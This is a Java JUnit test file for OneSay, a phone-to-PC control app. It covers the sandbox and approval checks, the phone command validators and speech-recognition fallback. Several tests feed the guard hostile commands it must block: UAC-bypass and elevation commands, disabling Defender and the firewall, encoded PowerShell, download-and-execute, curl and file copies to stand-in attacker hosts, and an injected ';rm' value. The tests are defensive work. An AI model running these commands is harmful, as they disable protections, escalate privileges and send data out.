package com.onesay.desktop;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertNull;
import static org.junit.Assert.assertTrue;

import com.sun.net.httpserver.HttpServer;
import java.io.File;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;

import org.junit.After;
import org.junit.Test;

/**
 * link-v2 第二轮（2026-11-08 用户决定）：
 * <ol>
 *   <li>工作区可写档：命令 / 跑工作区脚本 / 工作区外写入改成「确认后按你自己的权限执行」；审批策略照常；安全插件照旧优先。</li>
 *   <li>编码 / 隐藏命令拦截保留（默认开、可单独关）。</li>
 *   <li>8 个手机指令加回来（电脑能发出、参数先查一遍）。</li>
 *   <li>语音识别默认「先看云端」：探测（有 Key 且连得上，短超时、缓存）→ 云端；否则本机离线；可强制仅云端 / 仅本机。</li>
 * </ol>
 */
public class Round2Test {

    static final LinkPolicy.Sandbox RO = LinkPolicy.Sandbox.READ_ONLY, WS = LinkPolicy.Sandbox.WORKSPACE_WRITE, FA = LinkPolicy.Sandbox.FULL_ACCESS;
    static final LinkPolicy.Approval UN = LinkPolicy.Approval.UNTRUSTED, OR = LinkPolicy.Approval.ON_REQUEST, NV = LinkPolicy.Approval.NEVER;

    @After public void restore() {
        SafeExec.reset(null, null);
        SafeExec.REMOTE.set(Boolean.FALSE);
    }

    static Map<String, Object> m(Object... kv) { return PcGuardTest.m(kv); }

    static String reason(PcGuard.Outcome o) { return PcGuardTest.reason(o); }

    static PcGuardTest.Stub stub(int answer) {
        PcGuardTest.Stub s = new PcGuardTest.Stub();
        s.answer = answer;
        return s;
    }

    // ================================================================== 1. 工作区可写档：确认后执行

    /** 正例：工作区可写 · 分类 / 按需，电脑上点了允许 → 命令按当前用户权限真的执行（不提权）。 */
    @Test public void workspaceWriteRunsCommandAfterConfirm() throws Exception {
        for (LinkPolicy.Approval ap : new LinkPolicy.Approval[]{UN, OR}) {
            Config c = PcPluginTest.cfg(WS, ap);
            PcGuardTest.Stub st = stub(PcGuard.ALLOW);
            PcGuard g = new PcGuard(c, st);
            PcGuard.Outcome o = g.check("phone", "sys_exec", m("command", "echo hi > ran.txt"));
            assertNull(ap.id + " 确认后放行：" + (o.reply == null ? "" : o.reply.text), o.reply);
            assertEquals(ap.id + " 问了一次", 1, st.asked.size());
            assertTrue("确认框里有完整命令", st.asked.get(0).contains("echo hi > ran.txt"));
            assertTrue("没生成脚本", !new File(c.workspaceDir, "scripts").exists() || new File(c.workspaceDir, "scripts").list().length == 0);
            if (!SafeExec.WINDOWS) {
                SafeExec.reset(() -> false, null);
                SafeExec.REMOTE.set(Boolean.TRUE);
                Actions.Result r = g.builtin("sys_exec", o.args);
                assertTrue(r.text, r.ok);
                assertTrue("在工作区里执行了", Files.exists(Path.of(c.workspaceDir, "ran.txt")));
            }
        }
    }

    /** 反例：拒绝 / 超时 / 「从不询问」/ 只读 → 都不执行、不生成脚本；「从不询问」下根本不问。 */
    @Test public void workspaceWriteCommandNegatives() throws Exception {
        Config c = PcPluginTest.cfg(WS, UN);
        PcGuardTest.Stub no = stub(PcGuard.DENY);
        assertEquals(LinkPolicy.R_CONFIRM_DENIED, reason(new PcGuard(c, no).check("phone", "sys_exec", m("command", "echo hi"))));
        assertEquals(1, no.asked.size());
        assertEquals(LinkPolicy.R_CONFIRM_TIMEOUT, reason(new PcGuard(c, stub(PcGuard.TIMEOUT)).check("phone", "sys_exec", m("command", "echo hi"))));
        Config never = PcPluginTest.cfg(WS, NV);
        PcGuardTest.Stub nv = stub(PcGuard.ALLOW);
        PcGuard gn = new PcGuard(never, nv);
        assertEquals(LinkPolicy.R_DENIED_BY_LEVEL, reason(gn.check("phone", "sys_exec", m("command", "echo hi"))));
        assertEquals(LinkPolicy.R_DENIED_BY_LEVEL, reason(gn.check("phone", "script_run", m("name", "a.ps1"))));
        assertEquals(LinkPolicy.R_DENIED_BY_LEVEL, reason(gn.check("phone", "file_write", m("path", "/tmp/x-outside.txt", "text", "x"))));
        assertEquals("从不询问：一次都没问", 0, nv.asked.size());
        PcGuardTest.Stub ro = stub(PcGuard.ALLOW);
        assertEquals(LinkPolicy.R_DENIED_BY_LEVEL, reason(new PcGuard(PcPluginTest.cfg(RO, UN), ro).check("phone", "sys_exec", m("command", "echo hi"))));
        assertEquals(0, ro.asked.size());
        for (Config x : new Config[]{c, never}) {
            File sc = new File(x.workspaceDir, "scripts");
            assertTrue("反例都不生成脚本", !sc.exists() || sc.list().length == 0);
        }
        // 操作第三方程序仍只在完全访问档
        assertEquals(LinkPolicy.Verdict.DENY, LinkPolicy.decide(LinkPolicy.Target.PC, new LinkPolicy.Mode(WS, OR), LinkPolicy.Cat.APP_OPERATE, null).verdict);
    }

    /** 工作区外写入：工作区可写下确认后按你的权限写；拒绝不写；OneSay 是管理员时确认了也拒（不变成管理员写）。 */
    @Test public void workspaceWriteOutsideWriteAfterConfirm() throws Exception {
        Path outside = Files.createTempDirectory("r2-outside").resolve("a.txt");
        Config c = PcPluginTest.cfg(WS, UN);
        PcGuard deny = new PcGuard(c, stub(PcGuard.DENY));
        PcGuard.Outcome d = deny.check("phone", "file_write", m("path", outside.toString(), "text", "x"));
        assertEquals(LinkPolicy.R_CONFIRM_DENIED, reason(d));
        assertFalse(Files.exists(outside));
        PcGuardTest.Stub st = stub(PcGuard.ALLOW);
        PcGuard g = new PcGuard(c, st);
        PcGuard.Outcome o = g.check("phone", "file_write", m("path", outside.toString(), "text", "来自手机"));
        assertNull(o.reply);
        assertTrue(st.asked.get(0), st.asked.get(0).contains("工作区以外"));
        SafeExec.reset(() -> false, null);
        SafeExec.REMOTE.set(Boolean.TRUE);
        assertTrue(g.builtin("file_write", o.args).ok);
        assertEquals("来自手机", Files.readString(outside));
        SafeExec.reset(() -> true, null);
        assertFalse("管理员身份下拒绝", g.builtin("file_write", g.check("phone", "file_write", m("path", outside.toString(), "text", "又来")).args).ok);
        assertEquals("来自手机", Files.readString(outside));
        // 不能借工作区外写入改 OneSay 自己的配置
        assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, reason(g.check("phone", "file_write", m("path", c.file.toAbsolutePath().toString(), "text", "pc_sandbox=full_access"))));
    }

    /** 安全插件照旧优先：即使电脑上会点「允许」，提权 / 要管理员 / 自授权 / 编码 / 断网 / 授权都不会走到确认。 */
    @Test public void pluginStillWinsInWorkspaceWrite() throws Exception {
        for (LinkPolicy.Approval ap : LinkPolicy.Approval.values()) {
            Config c = PcPluginTest.cfg(WS, ap);
            PcGuardTest.Stub st = stub(PcGuard.ALLOW);
            PcGuard g = new PcGuard(c, st);
            String[][] cases = {
                    {"Start-Process powershell -Verb RunAs", LinkPolicy.R_PLUGIN_BLOCKED},
                    {"cmd /c fodhelper.exe", LinkPolicy.R_PLUGIN_BLOCKED},
                    {"gsudo del x", LinkPolicy.R_PLUGIN_BLOCKED},
                    {"reg add HKLM\\Software\\X /v a /d 1 /f", LinkPolicy.R_NEEDS_ADMIN_SCRIPT},
                    {"sc stop WinDefend", LinkPolicy.R_NEEDS_ADMIN_SCRIPT},
                    {"netsh advfirewall set allprofiles state off", LinkPolicy.R_NEEDS_ADMIN_SCRIPT},
                    {"reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /ve /d cmd.exe /f", LinkPolicy.R_NEEDS_ADMIN_SCRIPT},
                    {"icacls C:\\Windows /grant Everyone:F", LinkPolicy.R_NEEDS_ADMIN_SCRIPT},
                    {"notepad %APPDATA%\\OneSay\\desktop.properties", LinkPolicy.R_SELF_GRANT_BLOCKED},
                    {"Stop-Process -Name OneSay", LinkPolicy.R_SELF_GRANT_BLOCKED},
                    {"powershell -enc ZQBjAGgAbwAgAGgAaQA=", LinkPolicy.R_PLUGIN_BLOCKED},
                    {"iex (iwr https://github.com/x)", LinkPolicy.R_PLUGIN_BLOCKED},
                    {"curl https://evil.example/x", LinkPolicy.R_PLUGIN_BLOCKED},
                    {"copy a.txt \\\\evil-host\\share\\", LinkPolicy.R_PLUGIN_BLOCKED}};
            for (String[] x : cases) {
                PcGuard.Outcome o = g.check("phone", "sys_exec", m("command", x[0]));
                assertEquals(ap.id + " " + x[0], x[1], reason(o));
                assertNotNull(o.reply);
                assertFalse(o.reply.ok);
            }
            assertEquals(ap.id + " 插件拦下的一条都没问", 0, st.asked.size());
            File[] sc = new File(c.workspaceDir, "scripts").listFiles();
            assertNotNull(sc);
            assertEquals(ap.id + " 只有要管理员的 5 条生成了脚本", 5, sc.length);
        }
    }

    /** 编码拦截保留：默认开；关掉（插件开着、单独关这一项）后编码命令走普通确认，但解出来的提权照样拦。 */
    @Test public void encodedRuleKeptAndSeparatelySwitchable() throws Exception {
        Config c = PcPluginTest.cfg(WS, UN);
        assertTrue("默认开", c.pluginEncoded && c.pluginEnabled);
        PcGuardTest.Stub st = stub(PcGuard.ALLOW);
        PcGuard g = new PcGuard(c, st);
        String benign = "powershell -enc ZQBjAGgAbwAgAGgAaQA="; // echo hi
        assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, reason(g.check("phone", "sys_exec", m("command", benign))));
        c.pluginEncoded = false;
        assertNull("单独关掉后：编码本身不拦，走确认", g.check("phone", "sys_exec", m("command", benign)).reply);
        assertEquals(1, st.asked.size());
        String runas = "powershell -enc " + java.util.Base64.getEncoder().encodeToString("Start-Process cmd -Verb RunAs".getBytes(StandardCharsets.UTF_16LE));
        assertEquals("解出来的提权照样拦", LinkPolicy.R_PLUGIN_BLOCKED, reason(g.check("phone", "sys_exec", m("command", runas))));
        assertEquals(1, st.asked.size());
        // 插件总开关关掉：可关项（编码）关，三条硬规则还在
        c.pluginEnabled = false;
        c.pluginEncoded = true;
        assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, reason(g.check("phone", "sys_exec", m("command", "Start-Process cmd -Verb RunAs"))));
        assertEquals(LinkPolicy.R_NEEDS_ADMIN_SCRIPT, reason(g.check("phone", "sys_exec", m("command", "sc stop WinDefend"))));
        assertEquals(LinkPolicy.R_SELF_GRANT_BLOCKED, reason(g.check("phone", "sys_exec", m("command", "Stop-Process -Name OneSay"))));
    }

    /** 工作区脚本：工作区可写下内容先过插件，普通内容确认后可以跑，要管理员的只告诉你自己用管理员运行。 */
    @Test public void workspaceScriptInWorkspaceWrite() throws Exception {
        Config c = PcPluginTest.cfg(WS, UN);
        Path dir = Files.createDirectories(Path.of(c.workspaceDir, "scripts"));
        Files.writeString(dir.resolve("ok.ps1"), "# 备份\nCopy-Item a b\n");
        Files.writeString(dir.resolve("adm.ps1"), "Set-Service WinDefend -StartupType Disabled\n");
        Files.writeString(dir.resolve("up.ps1"), "Start-Process cmd -Verb RunAs\n");
        PcGuardTest.Stub st = stub(PcGuard.ALLOW);
        PcGuard g = new PcGuard(c, st);
        assertNull(g.check("phone", "script_run", m("name", "ok.ps1")).reply);
        assertEquals(1, st.asked.size());
        assertEquals(LinkPolicy.R_NEEDS_ADMIN_SCRIPT, reason(g.check("phone", "script_run", m("name", "adm.ps1"))));
        assertEquals(LinkPolicy.R_PLUGIN_BLOCKED, reason(g.check("phone", "script_run", m("name", "up.ps1"))));
        assertEquals(1, st.asked.size());
        assertEquals(LinkPolicy.R_CONFIRM_DENIED, reason(new PcGuard(c, stub(PcGuard.DENY)).check("phone", "script_run", m("name", "ok.ps1"))));
    }

    /** 端到端（局域网）：工作区可写 · 分类，电脑上点允许 → 真的执行；拒绝 → 没执行；要管理员的 → 只生成脚本、不问。 */
    @Test public void endToEndWorkspaceWriteConfirmThenRun() throws Exception {
        int port = LanTest.freePortPair();
        Config pcCfg = LanTest.pc(port);
        pcCfg.workspaceDir = Files.createTempDirectory("r2-e2e").toFile().getCanonicalPath();
        pcCfg.setMode(new LinkPolicy.Mode(WS, UN));
        StringBuilder log = new StringBuilder();
        Agent agent = new Agent(pcCfg, new Main.TestActions(), x -> { synchronized (log) { log.append(x).append('\n'); } });
        AtomicInteger allow = new AtomicInteger(1);
        AtomicInteger prompts = new AtomicInteger();
        agent.confirms.onNew = d -> {
            prompts.incrementAndGet();
            new Thread(() -> {
                for (int i = 0; i < 200 && agent.confirms.list().isEmpty(); i++) try { Thread.sleep(10); } catch (InterruptedException ignored) { }
                Map<?, ?> x = (Map<?, ?>) agent.confirms.list().get(0);
                agent.confirms.resolve(((Number) x.get("id")).intValue(), allow.get() == 1);
            }).start();
        };
        agent.start();
        Thread.sleep(300);
        Path out = Files.createTempDirectory("r2-e2e-out");
        try {
            Config cli = LanTest.client(pcCfg, "127.0.0.1:" + port);
            Path marker = Path.of(pcCfg.workspaceDir, "ran.txt");
            if (!SafeExec.WINDOWS) {
                SafeExec.reset(() -> false, null);
                assertEquals(0, Cli.send(cli, "pc-lan", "sys_exec", m("command", "echo hi > ran.txt"), out, 10));
                assertEquals(1, prompts.get());
                assertTrue("确认后执行了", Files.exists(marker));
                Files.delete(marker);
            }
            allow.set(0);
            int before = prompts.get();
            assertEquals(1, Cli.send(cli, "pc-lan", "sys_exec", m("command", "echo hi > ran.txt"), out, 10));
            assertEquals(before + 1, prompts.get());
            assertFalse("拒绝了就没执行", Files.exists(marker));
            assertTrue(log.toString(), log.toString().contains(LinkPolicy.R_CONFIRM_DENIED));
            assertEquals(1, Cli.send(cli, "pc-lan", "sys_exec", m("command", "sc stop WinDefend"), out, 10));
            assertEquals("要管理员的不问", before + 1, prompts.get());
            assertTrue(log.toString(), log.toString().contains(LinkPolicy.R_NEEDS_ADMIN_SCRIPT));
            File[] sc = new File(pcCfg.workspaceDir, "scripts").listFiles();
            assertNotNull(sc);
            assertEquals(1, sc.length);
        } finally {
            agent.stop();
        }
    }

    // ================================================================== 3. 加回来的 8 个手机指令（电脑端能发出）

    @Test public void phoneExtraCommandsCanBeSent() {
        for (String c : new String[]{"flashlight", "setting_set", "file_write", "file_list", "uninstall_app", "script_list", "script_run", "sys_exec"}) {
            assertTrue(c, PhoneCmds.ALL.contains(c));
            assertTrue(c, PhoneCmds.EXTRA.contains(c));
        }
        assertEquals(18, PhoneCmds.ALL.size());
        assertNull(PhoneCmds.check("flashlight", m("on", true)));
        assertNull(PhoneCmds.check("flashlight", m()));
        assertNotNull(PhoneCmds.check("flashlight", m("on", "yes")));
        assertNull(PhoneCmds.check("setting_set", m("name", "brightness", "value", "50")));
        assertNotNull(PhoneCmds.check("setting_set", m("name", "brightness")));
        assertNull(PhoneCmds.check("file_write", m("path", "inbox/a.txt", "text", "x")));
        assertNotNull(PhoneCmds.check("file_write", m("path", "inbox/a.txt")));
        assertNotNull(PhoneCmds.check("file_write", m("path", "a", "text", "x".repeat(256 * 1024 + 1))));
        assertNull(PhoneCmds.check("uninstall_app", m("package", "com.example.app")));
        assertNotNull(PhoneCmds.check("uninstall_app", m("package", "com.example;rm")));
        assertNull(PhoneCmds.check("script_run", m("name", "a.sh")));
        assertNotNull(PhoneCmds.check("script_run", m()));
        assertNull(PhoneCmds.check("sys_exec", m("command", "settings get global adb_enabled")));
        assertNotNull(PhoneCmds.check("sys_exec", m("command", "")));
        assertNull(PhoneCmds.check("file_list", m()));
        assertNull(PhoneCmds.check("script_list", m()));
        assertEquals(20_000L, PhoneCmds.timeoutMs("sys_exec"));
        assertEquals(12_000L, PhoneCmds.timeoutMs("uninstall_app"));
        assertEquals(8_000L, PhoneCmds.timeoutMs("flashlight"));
    }

    @Test public void uiCanSendExtraPhoneCommandsAndShowsAsr() throws Exception {
        String ui = new String(Round2Test.class.getResourceAsStream("/onesay/ui/index.html").readAllBytes(), StandardCharsets.UTF_8);
        for (String c : new String[]{"'flashlight'", "'setting_set'", "'file_write'", "'file_list'", "'uninstall_app'", "'script_list'", "'script_run'", "'sys_exec'"})
            assertTrue(c, ui.contains("phone(" + c));
        assertTrue(ui.contains("seg('asr_pref'"));
        assertTrue(ui.contains("['auto','先看云端'],['cloud','仅云端'],['local','仅本机']"));
        assertTrue("显示现在用的是哪个", ui.contains("现在用的是") && ui.contains("S.asr_engine_zh"));
        assertFalse("不再说手机上要点允许一次", ui.contains("手机上可能要点「允许一次」"));
        for (String w : new String[]{"Bixby", "三星"}) assertFalse(w, ui.contains(w));
    }

    // ================================================================== 4. 语音识别：先看云端

    static final class Clock {
        final AtomicLong t = new AtomicLong(1_000_000);
    }

    static AsrRoute route(Config c, Clock clk, boolean cloudUp, boolean localUp, List<String> used) {
        AsrRoute r = new AsrRoute(c);
        r.clock = clk.t::get;
        r.probe = (base, ms) -> cloudUp;
        r.localAvailable = () -> localUp;
        r.cloud = (base, key) -> (pcm, rate) -> { used.add("cloud"); return "云端结果"; };
        r.local = (pcm, rate) -> { used.add("local"); return "本机结果"; };
        return r;
    }

    static Config asrCfg(String key, String pref) throws Exception {
        Config c = new Config(Files.createTempFile("asr", ".properties"));
        c.asrKey = key;
        c.asrPref = pref;
        return c;
    }

    @Test public void asrAutoUsesCloudWhenAvailableAndCaches() throws Exception {
        Config c = asrCfg("sk-test", "auto");
        Clock clk = new Clock();
        List<String> used = new CopyOnWriteArrayList<>();
        AsrRoute r = route(c, clk, true, true, used);
        assertEquals(AsrRoute.Engine.CLOUD, r.choose());
        assertEquals(1, r.probes);
        AsrRoute.Result res = r.recognize(new byte[3200], 16000);
        assertEquals("云端结果", res.text);
        assertEquals(AsrRoute.Engine.CLOUD, res.engine);
        assertEquals("缓存期内不再探测", 1, r.probes);
        clk.t.addAndGet(AsrRoute.OK_TTL_MS + 1);
        r.choose();
        assertEquals("缓存过期后再探测", 2, r.probes);
        assertEquals("cloud", r.view().get("asr_engine"));
        assertEquals("云端", r.view().get("asr_engine_zh"));
        // 换了 Key → 重新探测
        c.asrKey = "sk-other";
        r.choose();
        assertEquals(3, r.probes);
    }

    @Test public void asrAutoFallsBackToLocalWhenCloudUnavailable() throws Exception {
        Config c = asrCfg("sk-test", "auto");
        Clock clk = new Clock();
        List<String> used = new CopyOnWriteArrayList<>();
        AsrRoute r = route(c, clk, false, true, used);
        AsrRoute.Result res = r.recognize(new byte[3200], 16000);
        assertEquals(AsrRoute.Engine.LOCAL, res.engine);
        assertEquals("本机结果", res.text);
        assertEquals(List.of("local"), used);
        assertTrue(r.why, r.why.contains("云端连不上"));
        assertEquals("本机离线", r.view().get("asr_engine_zh"));
        // 连不上的结果只缓存一小会儿
        r.choose();
        assertEquals(1, r.probes);
        clk.t.addAndGet(AsrRoute.FAIL_TTL_MS + 1);
        r.probe = (base, ms) -> true;
        assertEquals("网络恢复后回到云端", AsrRoute.Engine.CLOUD, r.choose());
        // 没填 Key：直接本机，不探测
        Config nk = asrCfg("", "auto");
        AsrRoute r2 = route(nk, clk, true, true, used);
        assertEquals(AsrRoute.Engine.LOCAL, r2.choose());
        assertEquals("没 Key 不探测", 0, r2.probes);
        assertTrue(r2.why, r2.why.contains("没填识别 Key"));
        // 本机也不行：NONE，识别报清楚
        AsrRoute r3 = route(nk, clk, true, false, used);
        assertEquals(AsrRoute.Engine.NONE, r3.choose());
        try {
            r3.recognize(new byte[10], 16000);
            org.junit.Assert.fail("应该报没有可用的识别");
        } catch (IllegalStateException e) {
            assertTrue(e.getMessage(), e.getMessage().contains("本机也没有"));
        }
    }

    @Test public void asrProbeTimeoutCountsAsUnavailable() throws Exception {
        Config c = asrCfg("sk-test", "auto");
        List<String> used = new CopyOnWriteArrayList<>();
        AsrRoute r = route(c, new Clock(), true, true, used);
        r.probeTimeoutMs = 200;
        r.probe = (base, ms) -> { Thread.sleep(5000); return true; };
        long t0 = System.currentTimeMillis();
        assertEquals(AsrRoute.Engine.LOCAL, r.choose());
        long took = System.currentTimeMillis() - t0;
        assertTrue("短超时：" + took + " ms", took < 1500);
        // 探测抛异常也算不可用
        r.invalidate();
        r.probe = (base, ms) -> { throw new java.io.IOException("断网"); };
        assertEquals(AsrRoute.Engine.LOCAL, r.choose());
    }

    @Test public void asrCloudErrorFallsBackOnceAndMarksDown() throws Exception {
        Config c = asrCfg("sk-test", "auto");
        Clock clk = new Clock();
        List<String> used = new CopyOnWriteArrayList<>();
        AsrRoute r = route(c, clk, true, true, used);
        r.cloud = (base, key) -> (pcm, rate) -> { used.add("cloud"); throw new IllegalStateException("识别 Key 无效（401）"); };
        AsrRoute.Result res = r.recognize(new byte[3200], 16000);
        assertTrue(res.fellBack);
        assertEquals(AsrRoute.Engine.LOCAL, res.engine);
        assertEquals(List.of("cloud", "local"), used);
        assertEquals("记成连不上：接下来直接本机", AsrRoute.Engine.LOCAL, r.choose());
        assertEquals(1, r.probes);
    }

    @Test public void asrForcedModes() throws Exception {
        Clock clk = new Clock();
        List<String> used = new CopyOnWriteArrayList<>();
        // 仅云端：不探测、不回落
        Config cc = asrCfg("sk-test", "cloud");
        AsrRoute rc = route(cc, clk, false, true, used);
        assertEquals(AsrRoute.Engine.CLOUD, rc.choose());
        assertEquals("仅云端不探测", 0, rc.probes);
        rc.cloud = (base, key) -> (pcm, rate) -> { throw new IllegalStateException("识别服务返回 503"); };
        try {
            rc.recognize(new byte[10], 16000);
            org.junit.Assert.fail("仅云端出错不回落");
        } catch (IllegalStateException e) {
            assertTrue(e.getMessage().contains("503"));
        }
        assertEquals(AsrRoute.Engine.NONE, route(asrCfg("", "cloud"), clk, true, true, used).choose());
        // 仅本机：有 Key 也不联网
        Config cl = asrCfg("sk-test", "local");
        AsrRoute rl = route(cl, clk, true, true, used);
        rl.probe = (base, ms) -> { throw new AssertionError("仅本机不该探测"); };
        used.clear();
        AsrRoute.Result res = rl.recognize(new byte[10], 16000);
        assertEquals(AsrRoute.Engine.LOCAL, res.engine);
        assertEquals(List.of("local"), used);
        assertEquals(0, rl.probes);
        assertEquals(AsrRoute.Engine.NONE, route(cl, clk, true, false, used).choose());
        // 钩子：仅云端没 Key 不抢空格；自动 / 仅本机可以开
        assertNotNull(Voice.cannotStart(AsrRoute.Pref.CLOUD, false));
        assertNull(Voice.cannotStart(AsrRoute.Pref.AUTO, false));
        assertNull(Voice.cannotStart(AsrRoute.Pref.LOCAL, false));
        assertNull(Voice.cannotStart(AsrRoute.Pref.CLOUD, true));
    }

    @Test public void asrConfigDefaultsAndLegacy() throws Exception {
        Path f = Files.createTempFile("asr-legacy", ".properties");
        assertEquals("默认先看云端", "auto", new Config(f).asrPref);
        Files.writeString(f, "asr_mode=cloud\n");
        assertEquals("旧版存的 cloud（以前只有云端能用）→ 先看云端", "auto", Config.load(f).asrPref);
        Files.writeString(f, "asr_mode=phone\n");
        assertEquals("auto", Config.load(f).asrPref);
        Files.writeString(f, "asr_mode=local\n");
        assertEquals("明确选过本机的保持仅本机", "local", Config.load(f).asrPref);
        Files.writeString(f, "asr_mode=cloud\nasr_pref=local\n");
        Config c = Config.load(f);
        assertEquals("local", c.asrPref);
        c.asrPref = "cloud";
        c.save();
        String saved = Files.readString(f);
        assertTrue(saved, saved.contains("asr_pref=cloud") && saved.contains("asr_mode=cloud"));
        assertEquals("cloud", Config.load(f).asrPref);
        assertEquals(AsrRoute.Pref.AUTO, AsrRoute.Pref.of("garbage"));
    }

    /** 探测不上传任何东西：空的 HEAD，不带 Key、不带内容；任何 HTTP 回应（401 也算）= 连得上；连不上 / 超时 = 不可用。 */
    @Test public void asrProbeSendsNothing() throws Exception {
        HttpServer srv = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        List<String> seen = new CopyOnWriteArrayList<>();
        srv.createContext("/", ex -> {
            byte[] body = ex.getRequestBody().readAllBytes();
            seen.add(ex.getRequestMethod() + "|" + ex.getRequestURI().getPath() + "|auth=" + ex.getRequestHeaders().containsKey("Authorization") + "|body=" + body.length);
            ex.sendResponseHeaders(401, -1);
            ex.close();
        });
        srv.start();
        try {
            String base = "http://127.0.0.1:" + srv.getAddress().getPort() + "/compatible-mode/v1";
            assertTrue("401 也算连得上", AsrRoute.httpProbe(base, 1500));
            assertEquals(List.of("HEAD|/compatible-mode/v1/models|auth=false|body=0"), seen);
            // 走 AsrRoute 的完整路径（真探测）：同样只有一个空 HEAD
            Config c = asrCfg("sk-secret", "auto");
            c.asrBase = base;
            AsrRoute r = new AsrRoute(c);
            r.localAvailable = () -> false;
            assertEquals(AsrRoute.Engine.CLOUD, r.choose());
            assertEquals(2, seen.size());
            assertFalse("Key 没发出去", seen.get(1).contains("auth=true"));
        } finally {
            srv.stop(0);
        }
        int dead = LanTest.freePortPair();
        Config d = asrCfg("sk-secret", "auto");
        d.asrBase = "http://127.0.0.1:" + dead + "/v1";
        AsrRoute rd = new AsrRoute(d);
        rd.localAvailable = () -> false;
        assertEquals("连不上 = 不可用", AsrRoute.Engine.NONE, rd.choose());
        assertTrue(rd.why, rd.why.contains("云端连不上"));
    }

    @Test public void localAsrWavHeader() {
        byte[] pcm = new byte[3200];
        byte[] w = LocalAsr.wav(pcm, 16000);
        assertEquals(44 + 3200, w.length);
        assertEquals("RIFF", new String(w, 0, 4, StandardCharsets.US_ASCII));
        assertEquals("WAVE", new String(w, 8, 4, StandardCharsets.US_ASCII));
        ByteBuffer b = ByteBuffer.wrap(w).order(ByteOrder.LITTLE_ENDIAN);
        assertEquals(1, b.getShort(22));     // 单声道
        assertEquals(16000, b.getInt(24));   // 采样率
        assertEquals(16, b.getShort(34));    // 16 位
        assertEquals(3200, b.getInt(40));
        if (!SafeExec.WINDOWS) assertFalse("非 Windows 没有本机离线识别", LocalAsr.available());
    }
}
